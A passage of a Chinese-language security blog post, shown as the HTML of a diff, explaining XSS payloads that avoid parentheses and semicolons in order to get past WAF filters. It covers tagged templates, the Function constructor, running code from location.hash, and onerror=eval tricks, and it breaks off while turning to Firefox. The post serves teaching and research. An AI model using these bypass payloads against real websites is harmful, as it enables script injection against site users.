@@ -1,0 +1,712 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top" lang="zh-tw">
+<head>
+    <meta charset="utf-8">
+<title>不需要括號跟分號的 XSS - Huli&#39;s blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+<link href="https://blog.huli.tw/2025/09/15/xss-without-semicolon-and-parentheses/" rel="alternate" hreflang="zh-TW" />
+
+
+<link href="https://blog.huli.tw/2025/09/15/xss-without-semicolon-and-parentheses/" rel="alternate" hreflang="x-default" />
+
+
+            
+<link href="https://blog.huli.tw/2025/09/15/en/xss-without-semicolon-and-parentheses/" rel="alternate" hreflang="en" />
+            
+
+
+
+
+
+    
+<link rel="canonical" href="https://blog.huli.tw/2025/09/15/xss-without-semicolon-and-parentheses/">
+    
+
+
+
+
+
+    <meta name="description" content="前陣子收到一封讀者來信，問我能不能寫一篇來講解 XSS without parentheses and semi-colons 這篇文章，說是這裡面的 payload 看不太懂。 因此，這篇就來簡單講解一下這些 payload，參考的原文是 Gareth Heyes 的這兩篇文章：  XSS technique without parentheses XSS without parentheses">
+<meta property="og:type" content="article">
+<meta property="og:title" content="不需要括號跟分號的 XSS">
+<meta property="og:url" content="https://blog.huli.tw/2025/09/15/xss-without-semicolon-and-parentheses/index.html">
+<meta property="og:site_name" content="Huli&#39;s blog">
+<meta property="og:description" content="前陣子收到一封讀者來信，問我能不能寫一篇來講解 XSS without parentheses and semi-colons 這篇文章，說是這裡面的 payload 看不太懂。 因此，這篇就來簡單講解一下這些 payload，參考的原文是 Gareth Heyes 的這兩篇文章：  XSS technique without parentheses XSS without parentheses">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="https://blog.huli.tw/img/xss-without-semicolon-and-parentheses/cover.png">
+<meta property="article:published_time" content="2025-09-14T20:50:00.000Z">
+<meta property="article:modified_time" content="2025-09-15T05:40:39.109Z">
+<meta property="article:author" content="Huli">
+<meta property="article:tag" content="JavaScript">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog.huli.tw/img/xss-without-semicolon-and-parentheses/cover.png">
+
+
+
+<link rel="alternative" href="/atom.xml" title="不需要括號跟分號的 XSS" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/img/lidemy_logo.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+
+
+<link rel="stylesheet" href="/css/bulma.css?v=2.css">
+
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />
+
+
+<link rel="stylesheet" href="/css/style.css?v=4.css">
+
+
+
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-1393J2EVCZ');
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <script>
+        if (localStorage.getItem('dark-mode')) {
+            if (localStorage.getItem('dark-mode') === 'true') {
+                document.body.classList.add('dark-mode')
+            }
+        } else {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                document.body.classList.add('dark-mode')
+            }
+        }
+    </script>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/">
+                
+                    
+                    Huli&#39;s blog
+                    
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item "
+               href="/archives">文章列表</a>
+            
+            <a class="navbar-item "
+               href="/categories">分類</a>
+            
+            <a class="navbar-item "
+               href="/recommend">推薦閱讀</a>
+            
+            <a class="navbar-item "
+               href="/about">關於我</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            
+            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
+                <a class="navbar-item" title="目錄">
+                    目錄
+                </a>
+                <div class="navbar-dropdown">
+                    
+                    
+                    
+                    
+                    <a class="navbar-item" href="#為什麼我們需要這種-payload">1&nbsp;&nbsp;<b>為什麼我們需要這種 payload？</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#先從不需要括號開始">2&nbsp;&nbsp;<b>先從不需要括號開始</b></a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#tagged-template-strings">2.1&nbsp;&nbsp;Tagged template strings</a>
+                    
+                    
+                    
+                    <a class="navbar-item" href="#onerror-事件">2.2&nbsp;&nbsp;onerror 事件</a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#再省去分號">3&nbsp;&nbsp;<b>再省去分號</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#其他-payload">4&nbsp;&nbsp;<b>其他 payload</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#總結">5&nbsp;&nbsp;<b>總結</b></a>
+                    
+                </div>
+            </div>
+            
+            
+            <a class="navbar-item" target="_blank" title="Medium" href="https://hulitw.medium.com/">
+                
+                <i class="fab fa-medium"></i>
+                
+            </a>
+               
+            <a class="navbar-item" target="_blank" title="Facebook" href="https://www.facebook.com/huli.blog">
+                
+                <i class="fab fa-facebook"></i>
+                
+            </a>
+               
+            <a class="navbar-item" target="_blank" title="RSS" href="/atom-ch.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+               
+            
+            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
+                <div>
+                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
+                    <defs>
+                    </defs>
+                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
+                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
+                    </g>
+                    </svg>
+                </div>
+            </a>
+            
+                <a class="navbar-item" href="/2025/09/15/en/xss-without-semicolon-and-parentheses/">English</a>
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+      
+      <div data-nosnippet class="self-notice">
+        如果有什麼想回饋的（如對文章或部落格的感想），除了留言以外也能填表單跟我說：<a href="https://forms.gle/XuWyRC5qtSd2ANta8" target="_blank">表單連結</a>。若是對更多 JavaScript 知識有興趣，歡迎參考我的新書<a target="_blank" rel="noopener" href="https://www.tenlong.com.tw/products/9786267757048">《JavaScript 重修就好》</a>
+      </div>
+      
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            不需要括號跟分號的 XSS
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2025-09-14T20:50:00.000Z" itemprop="datePublished">2025年9月15日</time>
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/categories/JavaScript/">JavaScript</a>
+        </span>
+        
+        
+        
+    </div>
+    
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <p>前陣子收到一封讀者來信，問我能不能寫一篇來講解 <a target="_blank" rel="noopener" href="https://portswigger.net/research/xss-without-parentheses-and-semi-colons">XSS without parentheses and semi-colons</a> 這篇文章，說是這裡面的 payload 看不太懂。</p>
+<p>因此，這篇就來簡單講解一下這些 payload，參考的原文是 Gareth Heyes 的這兩篇文章：</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://thespanner.co.uk/2012/05/01/xss-technique-without-parentheses">XSS technique without parentheses</a></li>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/research/xss-without-parentheses-and-semi-colons">XSS without parentheses and semi-colons</a></li>
+</ol>
+<span id="more"></span>
+
+<h2><span id="為什麼我們需要這種-payload">為什麼我們需要這種 payload？</span></h2><p>有些人會想說既然都可以執行 JavaScript 了，幹嘛還要這麼多限制？而最大的原因是：WAF（Web Application Firewall），最常見的就是 Cloudflare 的 WAF，只要有一點風吹草動就把你擋下來，儘管你可以插入 HTML 或甚至執行 JavaScript，但只要含有某些 pattern 就直接把你擋掉。</p>
+<p>再者，有些情境會造成部分字元不可用，這時候就需要發揮創意，想辦法不用這些字元來湊出可以執行的程式碼。</p>
+<h2><span id="先從不需要括號開始">先從不需要括號開始</span></h2><p>在 JavaScript 中似乎要執行函式就一定要括號，那如果不能用括號該怎麼辦呢？</p>
+<h3><span id="tagged-template-strings">Tagged template strings</span></h3><p>第一種方法有些開發者應該用過，但可能一時不會想到。某些 JavaScript 的 library 會用 template strings 來執行函式，如 <a target="_blank" rel="noopener" href="https://github.com/porsager/postgres?tab=readme-ov-file#usage">Postgres.js</a>：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">async</span> <span class="token keyword">function</span> <span class="token function">getUsersOver</span><span class="token punctuation">(</span><span class="token parameter">age</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token keyword">const</span> users <span class="token operator">=</span> <span class="token keyword">await</span> sql<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
+    select
+      name,
+      age
+    from users
+    where age > </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span> age <span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">
+  </span><span class="token template-punctuation string">`</span></span>
+  <span class="token comment">// users = Result [&#123; name: "Walter", age: 80 &#125;, &#123; name: 'Murray', age: 68 &#125;, ...]</span>
+  <span class="token keyword">return</span> users
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>不懂的人乍看之下會想說怎麼這樣寫，難道不是個 SQL injection 漏洞嗎？</p>
+<p>如果只用了 template strings 的話，那確實是，但注意前面多了個 <code>sql</code>，這就不一樣了，就不只是單純的字串拼接，而是函式執行了，是一個 JavaScript 的語法，可以看底下範例：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token parameter"><span class="token operator">...</span>args</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span>
+
+test<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">Hello </span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token string">'huli'</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">!!!</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token string">'good'</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">~~</span><span class="token template-punctuation string">`</span></span>
+<span class="token comment">// [['Hello ', '!!!', '~~'], 'huli', 'good']</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>當我們在前面加上一個函式時，函式的參數會收到原始字串中固定的部分，以及被插入的變數，就可以直接用這些資訊做 sanitization，來避免 SQL injection，這種用法叫做 tagged templates strings。</p>
+<p>最後達成的效果就是看起來只是字串取代，但背後是函式執行而且有做 sanitization，所以其實是安全的。</p>
+<p>利用這個概念，就可以寫出不需要括號的 XSS payload：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">alert<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">test</span><span class="token template-punctuation string">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>但有些人會問說，這樣的話就只能執行 alert 而已，有沒有辦法執行任意程式碼呢？例如說 fetch 好了，我如果想要 POST 的話，一定要用到第二個參數：<code>fetch(url, &#123; method:&#39;POST&#39;&#125;)</code>，而上面的方法第二個參數會是個陣列，因此 fetch 會報錯，就跑不動了。</p>
+<p>針對這個問題，我們可以先利用 function constructor，傳入字串來建立一個函式，不熟這個的之後可以去讀：<a href="https://blog.huli.tw/2020/12/01/write-conosle-log-1-without-alphanumeric/">如何不用英文字母與數字寫出 console.log(1)？</a>或是<a href="https://blog.huli.tw/2021/06/07/xss-challenge-by-intigriti-writeup-may/">Intigriti’s 0521 XSS 挑戰解法：限定字元組合程式碼</a>，但我還是先簡單介紹一下。</p>
+<p>在 JavaScript 中，可以用 <code>new Function(code)</code> 來動態建立出一個函式：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">new</span> <span class="token class-name">Function</span><span class="token punctuation">(</span><span class="token string">'alert(1)'</span><span class="token punctuation">)</span>
+<span class="token comment">// anonymous() &#123; alert(1) &#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>而那個 new 其實不是必須的，拿掉也無妨。再者，動態建立的函式是可以傳參數的：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">new</span> <span class="token class-name">Function</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'alert(a+1)'</span><span class="token punctuation">)</span>
+<span class="token comment">// anonymous(a) &#123; alert(a+1) &#125;</span>
+
+<span class="token keyword">new</span> <span class="token class-name">Function</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">'alert(a+b)'</span><span class="token punctuation">)</span>
+<span class="token comment">// anonymous(a,b) &#123; alert(a+b) &#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>最後一個參數會被當作實際的程式碼，前面的都會被當成是函式的參數，並且回傳建立好的函式。</p>
+<p>因此，我們可以利用這點搭配剛剛講的 tagged templates，從字串建立函式：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Function<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">alert(1)</span><span class="token template-punctuation string">`</span></span>
+<span class="token comment">// anonymous() &#123; alert(1) &#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>那這個建立出來的函式，要怎麼執行呢？很簡單，再用一次相同作法就好：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 最後多加兩個 ``，就跟前面講過的 alert`1` 用法一樣</span>
+<span class="token comment">// 怕 markdown parser 出錯，多加一個空格，但有沒有都一樣</span>
+Function<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">alert(1)</span><span class="token template-punctuation string">`</span></span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token template-punctuation string">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>因為裡面的 <code>alert(1)</code> 是字串，所以括號可以直接用 unicode 來取代，這也是合法的字串表示方法，會變成：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 其實就是 alert(1) 啦</span>
+Function<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">alert\u00281\u0029</span><span class="token template-punctuation string">`</span></span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token template-punctuation string">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>這樣整個 payload 就沒有用到任何括號，但又能執行任意程式碼了！</p>
+<p>這個做法用到的是執行 template 時的第一個參數，也就是固定的部分，但我們也可以用到後面的參數。舉例來說：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span> <span class="token comment">// ['_', '']</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span> <span class="token comment">// hello</span>
+<span class="token punctuation">&#125;</span>
+
+test<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">_</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token string">'hello'</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>當我們同時傳入固定字串與參數時，第一個參數是所有固定的部分，這個剛提過了，而第二個參數則是我們動態傳入的變數 <code>hello</code>。</p>
+<p>用上面的方法建立函式時，如同剛講過的，最後的參數會被當作 function body：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">Function<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">_</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token string">'hello'</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>
+<span class="token comment">// anonymous(_,) &#123; hello &#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>因此這個 <code>hello</code> 就是我們可以控制的部分了。因為它是動態傳入的，所以能玩的方法就很多了，可以搭配網站上我們能控制的地方。舉例來說，<code>location.hash</code> 會回傳 URL 上的 hash 如 <code>#test</code>，只要加上 slice(1) 就可以把前面的 # 去掉，結合起來就是：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 從剛剛講到的這個開始</span>
+Function<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">_</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token string">'hello'</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>
+
+<span class="token comment">// 先換成 location.hash.slice(1)</span>
+Function<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">_</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>
+
+<span class="token comment">// 把 slice(1) 換成 ``</span>
+Function<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">_</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span>slice<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">1</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span>
+
+<span class="token comment">// 最後再加上 `` 執行函式</span>
+<span class="token comment">// 記得把網站的 hash 弄成 #alert(1)</span>
+Function<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">_</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span>slice<span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">1</span><span class="token template-punctuation string">`</span></span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token template-punctuation string">`</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>就組出了一個不用括號但卻能執行任意程式碼的 payload，把實際要執行的字串放在 hash，動態去執行 hash 中的程式碼。</p>
+<h3><span id="onerror-事件">onerror 事件</span></h3><p>前面寫這麼多其實還沒進入正題，開頭提的原文發現的是另外一種更巧妙的方法。</p>
+<p>在瀏覽器環境中，利用 <code>window.onerror</code>，可以接收到所有沒有被 catch 的錯誤事件：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function-variable function">onerror</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token operator">=></span> console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Err:'</span> <span class="token operator">+</span> err<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">throw</span> <span class="token string">'hello'</span><span class="token punctuation">;</span>
+<span class="token comment">// Err:Uncaught hello</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>話說上面這段程式碼直接在 DevTools 執行會不起作用（原因在原文有講到，在 console 直接執行時錯誤不會被丟到 onerror），請開一個 HTML 來測。</p>
+<p>總之呢，上面的程式碼告訴我們在 Chrome 上，被捕捉到的錯誤訊息會是 <code>Uncaught hello</code>。</p>
+<p>那如果我們直接把 <code>onerror</code> 換成 <code>alert</code> 呢？</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">onerror <span class="token operator">=</span> alert<span class="token punctuation">;</span>
+<span class="token keyword">throw</span> <span class="token string">'hello'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>你就會直接看到一個 <code>Uncaught hello</code> 的 popup。上面的 payload 是沒有用到任何括號的，也達成了執行函式的目的。</p>
+<p>再進一步延伸，就是把 <code>onerror</code> 換成 <code>eval</code>，把錯誤訊息當成 JavaScript 程式碼來執行，但問題是換成 eval 之後，要怎麼湊出合法的程式碼？</p>
+<p>由於被捕捉到的錯誤訊息會是：<code>Uncaught &#123;payload&#125;</code>，這整句會被當成是程式碼來執行，因此只要把 payload 換成：<code>=alert(1)</code>，整句就是：<code>Uncaught=alert(1)</code>，把錯誤訊息中的 <code>Uncaught</code> 當成是變數來用了，如此一來就是合法的程式碼：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">onerror <span class="token operator">=</span> eval<span class="token punctuation">;</span>
+<span class="token keyword">throw</span> <span class="token string">'=alert(1)'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>如果還是不知道原理的話，把 eval 換成 console.log 就很清楚了：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">onerror <span class="token operator">=</span> console<span class="token punctuation">.</span>log<span class="token punctuation">;</span>
+<span class="token keyword">throw</span> <span class="token string">'=alert(1)'</span><span class="token punctuation">;</span>
+<span class="token comment">// Uncaught =alert(1)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>再來，由於 throw 後面接的是字串，所以可以跟前面一樣用 encoding 來代替，用 <code>\x28</code> 或是 <code>\u0028</code> 都行：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">onerror <span class="token operator">=</span> eval<span class="token punctuation">;</span>
+<span class="token keyword">throw</span> <span class="token string">'=alert\x281\u0029'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>就湊出了一個不需要括號的 payload。</p>
+<h2><span id="再省去分號">再省去分號</span></h2><p>Tagged template strings 已經不需要分號了，因此我們繼續沿著 onerror 這條路走，看看怎麼把分號省掉。</p>
+<p>一個簡單直覺的想法是用逗號就好（為了方便舉例，底下都用 alert 了）：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">onerror<span class="token operator">=</span>alert<span class="token punctuation">,</span><span class="token keyword">throw</span> <span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>但跑了以後會發現報錯：<code>Uncaught SyntaxError: Unexpected token &#39;throw&#39;</code>，這是因為 throw 不是個 expression 而是 statement，因此不能放在逗號後面，我們需要別的方法。</p>
+<p>在 JavaScript 中就算你沒有用 if 或其他需要區塊的程式碼，也可以自己用區塊把程式碼包起來：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>
+  <span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
+  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>這在開發上是確實會用到的（儘管不多），用途就是刻意建立區塊並且搭配 <code>let</code> 或是 <code>const</code> 的關鍵字，讓變數只活在這個區塊裡。</p>
+<p>只要利用區塊，就可以達成不用分號也能分隔程式碼的目的了：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span>onerror<span class="token operator">=</span>alert<span class="token punctuation">&#125;</span><span class="token keyword">throw</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>除了利用區塊以外，還有其他更酷炫的方法。</p>
+<p>先來講一下 JavaScript 中逗號的用法，基本上就是串聯幾個 expression 並回傳最後一個的結果，如：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">if</span> <span class="token punctuation">(</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#125;</span>
+<span class="token comment">// 1</span>
+<span class="token comment">// true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>if</code> 中的表達式會依序執行 <code>console.log(1)</code>、<code>alert(1)</code> 最後回傳 true，因此 <code>if</code> 的結果成立，印出 true。</p>
+<p>而 <code>throw</code> 後面可以接一個表達式，因此你可以：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">throw</span> onerror<span class="token operator">=</span>alert<span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>就會先執行 <code>onerror=alert</code>，再執行 <code>throw 1</code>，跟我們用 <code>&#123;&#125;</code> 的做法達成的效果是一樣的，這就是另外一種不需要分號的方法。</p>
+<p>Chrome 的地方就到這裡結束了，接下來都是為了 Firefox 所做的努力。</p>
+<p>在 Firefox 中有錯誤時，它錯誤訊息的格式不一樣：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">onerror<span class="token operator">=</span>alert<span class="token punctuation">;</span>
+<span class="token keyword">throw</span> <span class="token number">1</span><span class="token punctuation">;</span>
+<span class="token comment">// uncaught exception: 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>在這個錯誤訊息之下，組不出來合法的程式碼，之前提的把 <code>onerror</code> 換成 <code>eval</code> 就沒用了。</p>
+<p>於是 Gareth Heyes 就繼續深挖，發現了兩件事情。第一件事情是，如果 throw 一個 Error 而不是字串，錯誤訊息就不會有這些惱人的 prefix，只剩一個 <code>Error:</code>：</p>
